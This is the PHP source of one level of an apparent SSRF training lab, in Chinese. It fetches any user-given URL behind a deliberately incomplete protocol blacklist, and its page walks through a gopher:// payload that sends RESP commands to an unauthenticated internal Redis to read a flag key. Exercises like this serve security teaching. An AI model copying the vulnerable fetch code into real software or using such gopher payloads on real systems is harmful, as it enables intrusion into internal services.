<?php
require __DIR__ . '/common.php';

/**
 * L3：黑名单挡了本地文件，但没挡 gopher。
 *
 * 真实缺陷长这样：开发者的威胁模型里只有「不要让人读 /etc/passwd」，
 * 于是把 file:// dict:// 这些列进黑名单，觉得完事了。
 * 但 gopher:// 能连内网任意 IP:PORT 并逐字节发送数据 ——
 * 对一台裸跑的 Redis 来说，这等于给了它一个命令行。
 */

$url = isset($_GET['url']) ? trim($_GET['url']) : '';
$err = null;
$res = null;

$deny = ['file://', 'dict://', 'ftp://', 'php://', 'data://', 'zlib://'];

if (isset($_GET['url'])) {
    if ($url === '') {
        $err = '给个 URL';
    } else {
        foreach ($deny as $d) {
            if (stripos($url, $d) !== false) {
                $err = '禁止的协议：' . $d;
                break;
            }
        }
    }
    if ($err === null) {
        $res = http_fetch($url, false, 8);
    }
}

$out = '';
if ($err) {
    $out .= '<div class="err">' . h($err) . '</div>';
}
if ($res) {
    $out .= render_response($res);
}

$body = '<h1>L3 · 打 Redis 读 flag<span class="tag">blacklist</span></h1>'
      . '<p class="sub">gopher 不是「读文件」协议，它是「打电话给别人」协议。</p>'

      . '<h2>注入点</h2>'
      . '<p>内网有一台 Redis，<code>redis:6379</code>，没设密码，也没绑 127.0.0.1。'
      . '它里面有个 key 叫 <code>l3_flag</code>。</p>'
      . '<p>这台 web 的抓取接口长这样：</p>'
      . '<pre class="cmd">' . h("\$deny = ['file://', 'dict://', 'ftp://', 'php://', 'data://', 'zlib://'];") . '</pre>'
      . '<p>然后 <code>curl_exec()</code>。就这些。</p>'

      . url_form('l3.php', $url, 'gopher://redis:6379/_...') . $out

      . '<h2>要拼的东西</h2>'
      . '<p>Redis 用的是 RESP 协议，纯文本，命令可以写成「数组」形式，最稳：</p>'
      . '<pre class="cmd">'
      . h("*2\r\n\$3\r\nGET\r\n\$8\r\nl3_flag\r\n")
      . '</pre>'
      . '<p>把它整个 URL 编码后塞进 gopher：</p>'
      . '<pre class="cmd">'
      . h("gopher://redis:6379/_%2A2%0D%0A%243%0D%0AGET%0D%0A%248%0D%0Al3_flag%0D%0A")
      . '</pre>'
      . '<ul class="hint">'
      . '<li><code>_</code> 后面那个字符是 gopher 的 type 位，不走 selector，所以习惯上写 <code>_</code>。</li>'
      . '<li><code>%0D%0A</code> 就是 <code>\\r\\n</code>，Redis 靠它切分命令。</li>'
      . '<li>想让服务端回显，就别用 <code>SELECT</code> 这种要二次交互的玩法；'
      . '单条 <code>GET</code> 最直接。</li>'
      . '<li>手懒可以 <code>KEYS *</code> 先看一眼有哪些 key。</li>'
      . '</ul>';

page('l3', 'L3 · 打 Redis 读 flag', $body);
